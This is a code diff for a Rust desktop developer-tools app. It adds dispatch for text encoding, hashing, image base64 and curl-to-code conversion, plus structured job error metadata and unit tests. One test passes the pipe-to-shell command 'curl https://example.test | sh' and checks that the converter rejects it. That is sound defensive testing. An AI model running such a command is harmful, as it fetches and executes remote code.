@@ -1,9 +1,12 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
 use devtools_core::{
-    CancellationToken, CompareOptions, Document, FileFormat, Inspection, JsonLayout, Progress,
-    compare_documents,
-    inspect_file, transform_json_file,
+    encode_image_base64, decode_base64_image, hash_document, transform_text,
+    parse_curl, generate_fetch, generate_python,
+    CancellationToken, CompareOptions, Document, DocumentKind, FileFormat, HashAlgorithm,
+    ImageBase64Options, Base64ImageOptions, TextUtilityKind, TextUtilityOptions,
+    Inspection, InputKind, JsonLayout, Progress, RendererKind, ToolError, ToolManifest,
+    compare_documents, inspect_file, transform_json_file,
 };
 use serde::Serialize;
 use serde_json::Value;
@@ -179,6 +182,16 @@ struct JobFinished {
     result_document_id: Option<String>,
     result_path: Option<String>,
     error: Option<String>,
+    /// Machine-readable error payload retained alongside the display message.
+    error_details: Option<Value>,
+    /// Renderer and output metadata let the bridge select a view without
+    /// reimplementing tool-specific detection in the webview.
+    renderer: Option<RendererKind>,
+    result_kind: Option<InputKind>,
+    result_mime: Option<String>,
+    diagnostics: Vec<devtools_core::Diagnostic>,
+    source_document_id: Option<String>,
+    operation_id: Option<String>,
 }
 
 #[derive(Serialize)]
@@ -230,9 +243,143 @@ fn run_tool(
         FileFormat::Csv => (devtools_core::InputKind::Csv, "csv"),
         FileFormat::Text => (devtools_core::InputKind::Text, "text"),
     };
-    manifest.supports(input_kind, &operation_id)?;
-    start_operation_impl(document_id, operation_id, Some(format_name.into()), app, state)
-        .map_err(|message| devtools_core::ToolError::Execution { message })
+    // Hashing and image encoding consume the immutable raw bytes of an open
+    // file, so they are valid even when the preview detector labels the file
+    // as text. All other tools use the detected document kind for validation.
+    let validation_kind = if matches!(tool_id.as_str(), "encoding.hash" | "encoding.image-base64") && manifest.input_kinds.contains(&InputKind::Bytes) {
+        InputKind::Bytes
+    } else { input_kind };
+    manifest.supports(validation_kind, &operation_id)?;
+    if matches!(tool_id.as_str(), "structured.json" | "structured.csv" | "text.inspect") {
+        return start_operation_impl(document_id, operation_id, Some(format_name.into()), app, state)
+            .map_err(|message| devtools_core::ToolError::Execution { message });
+    }
+    if tool_id == "text.compare" {
+        return Err(ToolError::InvalidOptions { message: "text.compare requires two document handles; use run_compare".into() });
+    }
+    start_generic_operation(document_id, tool_id, operation_id, options, manifest, app, state)
+}
+
+/// Execute one of the registered in-process tools while keeping cancellation,
+/// progress, limits, temporary result files, and provenance in the host.
+fn start_generic_operation(
+    document_id: String,
+    tool_id: String,
+    operation_id: String,
+    options: Value,
+    manifest: ToolManifest,
+    app: tauri::AppHandle,
+    state: tauri::State<'_, Arc<HostState>>,
+) -> Result<StartedJob, ToolError> {
+    let document = state.documents.lock().map_err(|error| ToolError::Execution { message: error.to_string() })?
+        .get(&document_id).cloned()
+        .ok_or_else(|| ToolError::Execution { message: "Document is no longer open.".into() })?;
+    if let Some(max) = manifest.limits.max_input_bytes {
+        if document.size > max { return Err(ToolError::ResourceLimit { message: format!("input exceeds the {max}-byte tool limit") }); }
+    }
+    let token = CancellationToken::default();
+    let job_id = state.next_id("job");
+    let result_document_id = state.next_id("result");
+    let result_path = std::env::temp_dir().join(format!("devtools-pro-{}-{}.result", std::process::id(), result_document_id));
+    {
+        let mut jobs = state.jobs.lock().map_err(|error| ToolError::Execution { message: error.to_string() })?;
+        if jobs.len() >= MAX_JOBS { return Err(ToolError::ResourceLimit { message: "Two operations are already running. Cancel or wait for one to finish.".into() }); }
+        jobs.insert(job_id.clone(), token.clone());
+    }
+    let state = state.inner().clone();
+    let worker_id = job_id.clone();
+    let worker_result_id = result_document_id.clone();
+    let worker_result_path = result_path.clone();
+    let worker_tool_id = tool_id.clone();
+    let worker_operation = operation_id.clone();
+    tauri::async_runtime::spawn_blocking(move || {
+        let started = Instant::now();
+        let progress = |p: Progress| {
+            let _ = app.emit_to("main", "job-progress", JobProgress { job_id: worker_id.clone(), bytes_processed: p.bytes_processed, total_bytes: p.total_bytes, phase: p.phase });
+        };
+        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| -> Result<devtools_core::ToolResult, ToolError> {
+            let meta = fs::metadata(&document.path).map_err(ToolError::from)?;
+            if meta.len() != document.size || meta.modified().ok() != document.modified {
+                return Err(ToolError::Execution { message: "The input file changed. Reopen it before running another operation.".into() });
+            }
+            let bytes = fs::read(&document.path).map_err(ToolError::from)?;
+            let kind = if manifest.input_kinds.contains(&InputKind::Bytes) { DocumentKind::Binary } else { DocumentKind::Text };
+            let input = Document::from_bytes(bytes).with_kind(kind);
+            execute_registered_tool(&worker_tool_id, &worker_operation, &input, &options, &token, &progress)
+        })).unwrap_or_else(|_| Err(ToolError::Execution { message: "The worker failed unexpectedly; the workbench is still available.".into() }));
+        if let Ok(mut jobs) = state.jobs.lock() { jobs.remove(&worker_id); }
+        let mut finished = match result {
+            Ok(tool_result) => {
+                let output = tool_result.output;
+                let output_bytes = output.bytes().to_vec();
+                let output_len = output_bytes.len() as u64;
+                let exceeds = manifest.limits.max_output_bytes.is_some_and(|max| output_len > max);
+                if exceeds {
+                    JobFinished { job_id: worker_id.clone(), ok: false, cancelled: false, summary: "Operation failed.".into(), elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: document.size, output_bytes: None, output_path: None, result_document_id: None, result_path: None, error: Some("Tool output exceeds its declared limit.".into()), error_details: Some(serde_json::json!({"code":"resource_limit","message":"tool output exceeds its declared limit"})), renderer: Some(manifest.renderer), result_kind: None, result_mime: None, diagnostics: tool_result.diagnostics, source_document_id: Some(document_id.clone()), operation_id: Some(worker_operation.clone()) }
+                } else if let Err(error) = fs::write(&worker_result_path, &output_bytes) {
+                    JobFinished { job_id: worker_id.clone(), ok: false, cancelled: false, summary: "Operation failed.".into(), elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: document.size, output_bytes: None, output_path: None, result_document_id: None, result_path: None, error: Some(error.to_string()), error_details: Some(serde_json::json!({"code":"io","message":error.to_string()})), renderer: Some(manifest.renderer), result_kind: None, result_mime: None, diagnostics: tool_result.diagnostics, source_document_id: Some(document_id.clone()), operation_id: Some(worker_operation.clone()) }
+                } else {
+                    JobFinished { job_id: worker_id.clone(), ok: true, cancelled: false, summary: format!("{} completed.", manifest.label), elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: document.size, output_bytes: Some(output_len), output_path: None, result_document_id: Some(worker_result_id.clone()), result_path: Some(worker_result_path.to_string_lossy().into_owned()), error: None, error_details: None, renderer: Some(manifest.renderer), result_kind: Some(InputKind::from(output.kind)), result_mime: output.mime.clone(), diagnostics: tool_result.diagnostics, source_document_id: Some(document_id.clone()), operation_id: Some(worker_operation.clone()) }
+                }
+            }
+            Err(error) => { let message = error.to_string(); let details = serde_json::to_value(&error).ok(); JobFinished { job_id: worker_id.clone(), ok: false, cancelled: token.is_cancelled(), summary: if token.is_cancelled() { "Operation cancelled.".into() } else { "Operation failed.".into() }, elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: document.size, output_bytes: None, output_path: None, result_document_id: None, result_path: None, error: Some(message), error_details: details, renderer: Some(manifest.renderer), result_kind: None, result_mime: None, diagnostics: Vec::new(), source_document_id: Some(document_id.clone()), operation_id: Some(worker_operation.clone()) } },
+        };
+        if finished.ok {
+            if let Ok(meta) = fs::metadata(&worker_result_path) {
+                let result_doc = RegisteredDocument { path: worker_result_path.clone(), size: meta.len(), modified: meta.modified().ok(), temporary: true, display_name: Some(format!("{}.{}", document.path.file_stem().unwrap_or_default().to_string_lossy(), worker_operation)), origin_path: Some(document.path.clone()) };
+                if let Ok(mut documents) = state.documents.lock() {
+                    if documents.len() < MAX_DOCUMENTS { documents.insert(worker_result_id.clone(), result_doc); } else { let _ = fs::remove_file(&worker_result_path); finished.ok = false; finished.error = Some("Close an unused document before running another tool.".into()); finished.error_details = Some(serde_json::json!({"code":"resource_limit","message":"document handle limit reached"})); finished.result_document_id = None; finished.result_path = None; }
+                }
+            } else { finished.ok = false; finished.error = Some("The tool output was not created.".into()); finished.error_details = Some(serde_json::json!({"code":"execution","message":"The tool output was not created."})); finished.result_document_id = None; finished.result_path = None; }
+        } else { let _ = fs::remove_file(&worker_result_path); }
+        if let Ok(mut completed) = state.finished_jobs.lock() { completed.insert(worker_id.clone(), finished.clone()); while completed.len() > 32 { if let Some(oldest) = completed.keys().next().cloned() { completed.remove(&oldest); } else { break; } } }
+        let _ = app.emit_to("main", "job-finished", finished);
+    });
+    Ok(StartedJob { job_id })
+}
+
+fn execute_registered_tool(
+    tool_id: &str,
+    operation_id: &str,
+    input: &Document,
+    options: &Value,
+    token: &CancellationToken,
+    progress: &impl Fn(Progress),
+) -> Result<devtools_core::ToolResult, ToolError> {
+    if token.is_cancelled() { return Err(ToolError::Cancelled); }
+    match tool_id {
+        "text.url" | "text.html" | "text.unicode" => {
+            let kind = match tool_id { "text.url" => TextUtilityKind::Url, "text.html" => TextUtilityKind::Html, _ => TextUtilityKind::Unicode };
+            let opts: TextUtilityOptions = serde_json::from_value(options.clone()).map_err(|error| ToolError::InvalidOptions { message: error.to_string() })?;
+            progress(Progress { bytes_processed: 0, total_bytes: input.len() as u64, phase: "transforming".into() });
+            let result = transform_text(input, kind, operation_id, &opts)?;
+            progress(Progress { bytes_processed: input.len() as u64, total_bytes: input.len() as u64, phase: "complete".into() });
+            Ok(result)
+        }
+        "encoding.hash" => {
+            let algorithm = match operation_id { "sha256" => HashAlgorithm::Sha256, "sha512" => HashAlgorithm::Sha512, _ => return Err(ToolError::UnsupportedOperation { tool_id: tool_id.into(), operation_id: operation_id.into() }) };
+            let (hash, _) = hash_document(input, algorithm, token, progress)?;
+            let text = serde_json::to_string_pretty(&hash).map_err(|error| ToolError::Execution { message: error.to_string() })?;
+            Ok(devtools_core::ToolResult { output: Document::from_text(text).with_kind(DocumentKind::Text).with_mime("application/json"), diagnostics: Vec::new() })
+        }
+        "encoding.image-base64" => {
+            if operation_id != "encode" { return Err(ToolError::UnsupportedOperation { tool_id: tool_id.into(), operation_id: operation_id.into() }); }
+            let opts: ImageBase64Options = serde_json::from_value(options.clone()).map_err(|error| ToolError::InvalidOptions { message: error.to_string() })?;
+            encode_image_base64(input, &opts, token, progress).map(|(result, _)| result)
+        }
+        "encoding.base64-image" => {
+            if operation_id != "decode" { return Err(ToolError::UnsupportedOperation { tool_id: tool_id.into(), operation_id: operation_id.into() }); }
+            let opts: Base64ImageOptions = serde_json::from_value(options.clone()).map_err(|error| ToolError::InvalidOptions { message: error.to_string() })?;
+            decode_base64_image(input, &opts, token, progress).map(|(result, _)| result)
+        }
+        "web.curl-code" => {
+            let text = input.as_text().map_err(|_| ToolError::InvalidUtf8)?;
+            let (request, diagnostics) = parse_curl(text).map_err(|items| ToolError::Execution { message: items.into_iter().map(|item| item.message).collect::<Vec<_>>().join("; ") })?;
+            let output = match operation_id { "fetch" => generate_fetch(&request), "python" => generate_python(&request), _ => return Err(ToolError::UnsupportedOperation { tool_id: tool_id.into(), operation_id: operation_id.into() }) };
+            Ok(devtools_core::ToolResult { output: Document::from_text(output).with_kind(DocumentKind::Text).with_mime("text/plain"), diagnostics })
+        }
+        _ => Err(ToolError::UnknownTool { tool_id: tool_id.into() }),
+    }
 }
 
 /// Compare two open text documents through the same bounded scheduler used by
@@ -293,19 +440,19 @@ fn run_compare(
                 let bytes = match serde_json::to_vec_pretty(&comparison) {
                     Ok(bytes) => bytes,
                     Err(error) => {
-                        let failed = JobFinished { job_id: worker_id.clone(), ok: false, cancelled: false, summary: "Operation failed.".into(), elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: stats.input_bytes, output_bytes: None, output_path: None, result_document_id: None, result_path: None, error: Some(error.to_string()) };
+                        let failed = JobFinished { job_id: worker_id.clone(), ok: false, cancelled: false, summary: "Operation failed.".into(), elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: stats.input_bytes, output_bytes: None, output_path: None, result_document_id: None, result_path: None, error: Some(error.to_string()), error_details: Some(serde_json::json!({"code":"execution","message":error.to_string()})), renderer: Some(RendererKind::Diff), result_kind: None, result_mime: None, diagnostics: Vec::new(), source_document_id: Some(left_document_id.clone()), operation_id: Some("compare".into()) };
                         if let Ok(mut completed) = state.finished_jobs.lock() { completed.insert(worker_id.clone(), failed.clone()); }
                         let _ = app.emit_to("main", "job-finished", failed);
                         return;
                     }
                 };
                 if let Err(error) = fs::write(&worker_result_path, &bytes) {
-                    JobFinished { job_id: worker_id.clone(), ok: false, cancelled: false, summary: "Operation failed.".into(), elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: stats.input_bytes, output_bytes: None, output_path: None, result_document_id: None, result_path: None, error: Some(error.to_string()) }
+                    JobFinished { job_id: worker_id.clone(), ok: false, cancelled: false, summary: "Operation failed.".into(), elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: stats.input_bytes, output_bytes: None, output_path: None, result_document_id: None, result_path: None, error: Some(error.to_string()), error_details: Some(serde_json::json!({"code":"execution","message":error.to_string()})), renderer: Some(RendererKind::Diff), result_kind: None, result_mime: None, diagnostics: Vec::new(), source_document_id: Some(left_document_id.clone()), operation_id: Some("compare".into()) }
                 } else {
-                    JobFinished { job_id: worker_id.clone(), ok: true, cancelled: false, summary: serde_json::to_string(&comparison.summary).unwrap_or_else(|_| "Comparison completed.".into()), elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: stats.input_bytes, output_bytes: Some(bytes.len() as u64), output_path: None, result_document_id: Some(worker_result_id.clone()), result_path: Some(worker_result_path.to_string_lossy().into_owned()), error: None }
+                    JobFinished { job_id: worker_id.clone(), ok: true, cancelled: false, summary: serde_json::to_string(&comparison.summary).unwrap_or_else(|_| "Comparison completed.".into()), elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: stats.input_bytes, output_bytes: Some(bytes.len() as u64), output_path: None, result_document_id: Some(worker_result_id.clone()), result_path: Some(worker_result_path.to_string_lossy().into_owned()), error: None, error_details: None, renderer: Some(RendererKind::Diff), result_kind: Some(InputKind::Text), result_mime: Some("application/json".into()), diagnostics: Vec::new(), source_document_id: Some(left_document_id.clone()), operation_id: Some("compare".into()) }
                 }
             }
-            Err(error) => JobFinished { job_id: worker_id.clone(), ok: false, cancelled: token.is_cancelled(), summary: if token.is_cancelled() { "Operation cancelled.".into() } else { "Operation failed.".into() }, elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: left.size.saturating_add(right.size), output_bytes: None, output_path: None, result_document_id: None, result_path: None, error: Some(error) },
+            Err(error) => { let details = serde_json::json!({"code":"execution","message":error}); JobFinished { job_id: worker_id.clone(), ok: false, cancelled: token.is_cancelled(), summary: if token.is_cancelled() { "Operation cancelled.".into() } else { "Operation failed.".into() }, elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: left.size.saturating_add(right.size), output_bytes: None, output_path: None, result_document_id: None, result_path: None, error: Some(details["message"].as_str().unwrap_or("Operation failed.").into()), error_details: Some(details), renderer: Some(RendererKind::Diff), result_kind: None, result_mime: None, diagnostics: Vec::new(), source_document_id: Some(left_document_id.clone()), operation_id: Some("compare".into()) } },
         };
         if finished.ok {
             if let Ok(meta) = fs::metadata(&worker_result_path) {
@@ -396,14 +543,19 @@ fn start_operation_impl(
                 output_bytes: stats.output_bytes, output_path: None,
                 result_document_id: worker_result_document_id.clone(),
                 result_path: worker_result_path.as_ref().map(|p| p.to_string_lossy().into_owned()),
-                error: None,
+                error: None, error_details: None,
+                renderer: Some(if operation == "inspect" { RendererKind::Json } else { RendererKind::Json }),
+                result_kind: Some(InputKind::Json), result_mime: Some("application/json".into()),
+                diagnostics: Vec::new(), source_document_id: Some(document_id.clone()), operation_id: Some(operation.clone()),
             },
             Err(error) => JobFinished {
                 job_id: worker_id.clone(), ok: false, cancelled: token.is_cancelled(),
                 summary: if token.is_cancelled() { "Operation cancelled.".into() } else { "Operation failed.".into() },
                 elapsed_ms: started.elapsed().as_millis() as u64, input_bytes: document.size,
                 output_bytes: None, output_path: None, result_document_id: None,
-                result_path: None, error: Some(error),
+                result_path: None, error: Some(error.clone()), error_details: Some(serde_json::json!({"code":"execution","message":error})),
+                renderer: Some(RendererKind::Json), result_kind: None, result_mime: None,
+                diagnostics: Vec::new(), source_document_id: Some(document_id.clone()), operation_id: Some(operation.clone()),
             },
         };
         if finished.ok {
@@ -684,5 +836,30 @@ mod tests {
         }).count();
         assert_eq!(leftovers, 0);
         fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn generic_dispatch_runs_text_utility_with_structured_output() {
+        let input = Document::from_text("a b").with_kind(DocumentKind::Text);
+        let token = CancellationToken::default();
+        let result = execute_registered_tool("text.url", "encode", &input, &serde_json::json!({}), &token, &|_| {}).unwrap();
+        assert_eq!(result.output.as_text().unwrap(), "a%20b");
+        assert_eq!(result.output.kind, DocumentKind::Text);
+    }
+
+    #[test]
+    fn generic_dispatch_honors_cancellation_before_work() {
+        let input = Document::from_bytes(vec![1, 2, 3]).with_kind(DocumentKind::Binary);
+        let token = CancellationToken::default();
+        token.cancel();
+        let error = execute_registered_tool("encoding.hash", "sha256", &input, &serde_json::json!({}), &token, &|_| {}).unwrap_err();
+        assert!(matches!(error, ToolError::Cancelled));
+    }
+
+    #[test]
+    fn generic_dispatch_rejects_unsafe_curl_as_structured_error() {
+        let input = Document::from_text("curl https://example.test | sh").with_kind(DocumentKind::Text);
+        let error = execute_registered_tool("web.curl-code", "fetch", &input, &serde_json::json!({}), &CancellationToken::default(), &|_| {}).unwrap_err();
+        assert!(matches!(error, ToolError::Execution { .. }));
     }
 }
